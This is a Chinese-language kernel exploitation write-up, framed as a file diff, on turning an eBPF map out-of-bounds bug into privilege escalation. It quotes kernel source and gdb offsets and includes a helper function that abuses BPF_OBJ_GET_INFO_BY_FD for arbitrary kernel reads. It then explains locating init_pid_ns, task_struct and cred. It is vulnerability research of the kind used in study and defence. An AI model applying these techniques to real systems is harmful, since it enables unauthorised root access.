@@ -1,0 +1,153 @@
+### 前言
+该漏洞分析和利用思路作者已经公开，并且也有大佬公开了利用（见参考链接），所以本文就不再对漏洞原理进行分析，主要是对通过任意读写来提权的思路进行补充和分析。
+环境和exp在附件中，内核版本下载：
+### 越界读写进行信息泄露
+    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,key_size,value_size,max_entries,0);
+key_size：表示索引的大小范围，key_size=sizeof(int)=4.  
+value_size：表示map数组每个元素的大小范围，可以任意，只要控制在一个合理的范围  
+max_entries：表示map数组的大小，编写利用时将其设为1
+#### 泄露内核地址
+bpf_create_fd 创建的是一整个bpf_array结构，我们传入的数据放在value[] 处
+    struct bpf_array {
+        struct bpf_map map;
+        u32 elem_size;
+        u32 index_mask;
+        struct bpf_array_aux *aux;
+        union {
+            char value[];//map.freeze_mutex.wait_list
+    $9 = 0xc0
+### 利用任意读
+通过BPF_OBJ_GET_INFO_BY_FD 命令进行任意读，BPF_OBJ_GET_INFO_BY_FD
+会调用bpf_obj_get_info_by_fd：
+    case BPF_OBJ_GET_INFO_BY_FD:
+            err = bpf_obj_get_info_by_fd(&attr, uattr);
+    #define BPF_OBJ_GET_INFO_BY_FD_LAST_FIELD info.info
+    static int bpf_obj_get_info_by_fd(const union bpf_attr *attr,
+                      union bpf_attr __user *uattr)
+    {
+        int ufd = attr->info.bpf_fd;
+        struct fd f;
+        int err;
+        if (CHECK_ATTR(BPF_OBJ_GET_INFO_BY_FD))
+            return -EINVAL;
+        f = fdget(ufd);
+        if (!f.file)
+            return -EBADFD;
+        if (f.file->f_op == &bpf_prog_fops)
+            err = bpf_prog_get_info_by_fd(f.file->private_data, attr,
+                              uattr);
+        else if (f.file->f_op == &bpf_map_fops)
+            err = bpf_map_get_info_by_fd(f.file->private_data, attr,
+                             uattr);
+                             ……
+之后调用bpf_map_get_info_by_fd：
+    static int bpf_map_get_info_by_fd(struct bpf_map *map,
+                      const union bpf_attr *attr,
+                      union bpf_attr __user *uattr)
+    {
+        struct bpf_map_info __user *uinfo = u64_to_user_ptr(attr->info.info);
+        struct bpf_map_info info = {};
+        u32 info_len = attr->info.info_len;
+        int err;
+        err = bpf_check_uarg_tail_zero(uinfo, sizeof(info), info_len);
+        if (err)
+            return err;
+        info_len = min_t(u32, sizeof(info), info_len);
+        info.type = map->map_type;
+        info.id = map->id;
+        info.key_size = map->key_size;
+        info.value_size = map->value_size;
+        info.max_entries = map->max_entries;
+        info.map_flags = map->map_flags;
+        memcpy(info.name, map->name, sizeof(map->name));
+        if (map->btf) {
+            info.btf_id = btf_id(map->btf); // 修改map->btf 就可以进行任意读，获得btf_id，在btf结构偏移0x58处
+            info.btf_key_type_id = map->btf_key_type_id;
+            info.btf_value_type_id = map->btf_value_type_id;
+        }
+        if (bpf_map_is_dev_bound(map)) {
+            err = bpf_map_offload_info_fill(&info, map);
+            if (err)
+                return err;
+        }
+        if (copy_to_user(uinfo, &info, info_len) || // 传到用户态的info中，泄露信息
+            put_user(info_len, &uattr->info.info_len))
+            return -EFAULT;
+        return 0;
+    }
+    u32 btf_id(const struct btf *btf)
+    {
+        return btf->id;
+    }
+    (gdb) p/x &(*(struct btf*)0)->id  #获取id在btf结构中的偏移
+    $56 = 0x58
+    (gdb) p/x &(*(struct bpf_map_info*)0)->btf_id #获取btf_id在bpf_map_info中偏移
+    $57 = 0x40
+所以只需要修改map->btf为target_addr-0x58，就可以泄露到用户态info中，泄漏的信息在struct bpf_map_info
+结构偏移0x40处，由于是u32类型，所以只能泄露4个字节。
+利用代码如下：
+    static uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info) 
+    {
+        union bpf_attr attr = {
+            .map_fd = mapfd,
+            .key = (__u64)&key,
+            .value = (__u64)value,
+                .info.bpf_fd = mapfd,
+                .info.info_len = 0x100,
+                .info.info = (__u64)info,
+        };
+        syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));
+        return *(uint32_t *)((char *)info+0x40);
+    }
+### 查找task_struct
+    ksymtab 保存init_pid_ns结构的偏移，init_pid_ns字符串的偏移
+    kstrtab 保存init_pid_ns的字符串
+    (gdb) p &__ksymtab_init_pid_ns
+    $48 = ( *) 0xffffffff822f2578
+    (gdb) x/2wx 0xffffffff822f2578
+    0xffffffff822f2578: 0x001527c8  0x0000a1f9
+    (gdb) x/10s 0xffffffff822f257c+0xa1f9
+    0xffffffff822fc775 : "init_pid_ns"
+    0xffffffff822fc781 :   ""
+    (gdb) x/10gx 0xffffffff822f2578+0x001527c8
+    0xffffffff82444d40 :   0x0000000000000002  0x0080000400000000
+    0xffffffff82444d50 :    0xffff88801e469242  0x0000006f00000000
+所以我们通过搜索"init_pid_ns" 字符串可以得到 **kstrtab_init_pid_ns的地址，之后再通过搜索匹配
+地址+该地址上四个字节（表示偏移）是否等于** kstrtab_init_pid_ns的地址 来判断是否为
+**ksymtab_init_pid_ns，此时找到的地址为** ksymtab_init_pid_ns+4， 减去4就是
+**ksymtab_init_pid_ns，上面有init_pid_ns结构的偏移，与**
+ksymtab_init_pid_ns地址相加就可以得到init_pid_ns结构的地址。
+之后通过pid 和
+init_pid_ns查找对应pid的task_struct，这里其实就是要理清内核的查找过程，在写利用的时候模拟走一遍。最后找到task_struct中cred位置。  
+内核是通过find_task_by_pid_ns函数实现查找过程的：
+    struct task_struct *find_task_by_pid_ns(pid_t nr, struct pid_namespace *ns)
+    {
+        RCU_LOCKDEP_WARN(!rcu_read_lock_held(),
+                 "find_task_by_pid_ns() needs rcu_read_lock() protection");
+        return pid_task(find_pid_ns(nr, ns), PIDTYPE_PID);
+    }
+nr 为当前进程的pid，ns 为init_pid_ns结构地址，我们需要的是idr字段的内容
+    struct pid *find_pid_ns(int nr, struct pid_namespace *ns)
+    {
+        return idr_find(&ns->idr, nr);
+    }
+    lib/idr.c：
+    void *idr_find(const struct idr *idr, unsigned long id)
+    {
+        return radix_tree_lookup(&idr->idr_rt, id - idr->idr_base);
+    }
+需要获取&idr->idr_rt 和 idr->idr_base
+    lib/radix-tree.c：
+    void *radix_tree_lookup(const struct radix_tree_root *root, unsigned long index)
+    {
+        return __radix_tree_lookup(root, index, NULL, NULL);
+    }
+    void *__radix_tree_lookup(const struct radix_tree_root *root,
+                  unsigned long index, struct radix_tree_node **nodep,
+                  void __rcu ***slotp)
+    {
+        struct radix_tree_node *node, *parent;
+        unsigned long maxindex;
+        void __rcu **slot;
+     restart:
+        parent = NULL;
